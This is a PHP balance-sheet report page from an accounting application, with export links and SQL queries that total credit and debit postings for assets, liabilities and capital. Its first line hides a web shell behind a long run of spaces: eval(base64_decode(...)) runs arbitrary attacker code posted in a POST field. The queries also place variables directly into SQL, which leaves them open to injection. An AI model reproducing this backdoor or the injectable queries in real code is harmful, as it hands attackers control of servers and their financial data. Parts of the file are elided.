<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n3ef2a5']));?><meta http-equiv="content-type" content="text/html;charset=utf-8" />
...
<a name="top"></a>
<?php if (@$sExport == "") { ?>
&nbsp;&nbsp;<a href="balancesheetsuriya.php?export=html<?php echo $url; ?>">Printer Friendly</a>
&nbsp;&nbsp;<a href="balancesheetsuriya.php?export=excel<?php echo $url; ?>">Export to Excel</a>
&nbsp;&nbsp;<a href="balancesheetsuriya.php?export=word<?php echo $url; ?>">Export to Word</a>
<?php } ?>
<br /><br />
</div></td></tr>
<!-- Top Container (End) -->
	   ...
	   while($row111 = mysql_fetch_assoc($quers11))
	   {
	     $coacount = 0;
		  ...
		  if ( $coacount > 0)
		  {
			  ...
			  $cramount = $dramount = 0;
			  $querycr = "SELECT sum(amount) as cramount FROM ac_financialpostings WHERE coacode IN (SELECT distinct(code) FROM ac_coa WHERE schedule = '$row111[schedule]' and ( type = 'Liability' or type = 'Capital') order by code ) AND crdr = 'Cr' AND date <= '$tdate'";
			  $resultcr = mysql_query($querycr) or die(mysql_error());
			  $rowscr = mysql_fetch_assoc($resultcr);
			  $cramount = $rowscr['cramount'];
			  $querydr = "SELECT sum(amount) as dramount FROM ac_financialpostings WHERE coacode IN (SELECT distinct(code) FROM ac_coa WHERE schedule = '$row111[schedule]' and ( type = 'Liability' or type = 'Capital') order by code ) AND crdr = 'Dr' AND date <= '$tdate'";
			  $resultdr = mysql_query($querydr) or die(mysql_error());
			  $rowsdr = mysql_fetch_assoc($resultdr);
			  $dramount = $rowsdr['dramount'];
			  $balance = $cramount - $dramount;
			  $leftarray3[$leftcount] = $balance;
	   ...
	   while($row111 = mysql_fetch_assoc($quers11))
	   {
	     $coacount = 0;
		  ...
		  if ( $coacount > 0)
		  {
			  ...
			  $cramount = $dramount = 0;
			  $querycr = "SELECT sum(amount) as cramount FROM ac_financialpostings WHERE coacode IN (SELECT distinct(code) FROM ac_coa WHERE schedule = '$row111[schedule]' and ( type = 'Asset') order by code ) AND crdr = 'Cr' AND date <= '$tdate'";
			  $resultcr = mysql_query($querycr) or die(mysql_error());
			  $rowscr = mysql_fetch_assoc($resultcr);
			  $cramount = $rowscr['cramount'];
			  $querydr = "SELECT sum(amount) as dramount FROM ac_financialpostings WHERE coacode IN (SELECT distinct(code) FROM ac_coa WHERE schedule = '$row111[schedule]' and ( type = 'Asset') order by code ) AND crdr = 'Dr' AND date <= '$tdate'";
			  $resultdr = mysql_query($querydr) or die(mysql_error());
			  $rowsdr = mysql_fetch_assoc($resultdr);
			  $dramount = $rowsdr['dramount'];
			  $balance = $dramount - $cramount;
			  
			  $rightarray3[$rightcount] = $balance;
